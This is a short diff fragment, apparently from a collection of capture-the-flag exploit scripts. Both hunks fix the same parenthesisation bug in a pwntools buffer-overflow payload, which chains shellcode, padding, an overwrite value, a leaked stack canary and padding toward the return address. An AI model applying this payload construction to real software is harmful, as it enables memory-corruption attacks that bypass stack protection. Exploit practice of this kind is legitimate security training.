@@ -12137,7 +12137,7 @@ p.sendline(str(payload_size).encode())
 
 # Craft payload
 payload = shellcode
-payload += b"A" * offset_to_no_exit_value - len_shellcode
+payload += b"A" * (offset_to_no_exit_value - len_shellcode)
 payload += p64(no_exit_value)
 payload += p64(canary)
 payload += b"B" * offset_to_ret
@@ -12890,7 +12890,7 @@ p.sendline(str(payload_size).encode())
 
 # Craft payload
 payload = shellcode
-payload += b"A" * offset_to_no_exit_value - len_shellcode
+payload += b"A" * (offset_to_no_exit_value - len_shellcode)
 payload += p64(no_exit_value)
 payload += p64(canary)
 payload += b"B" * 8
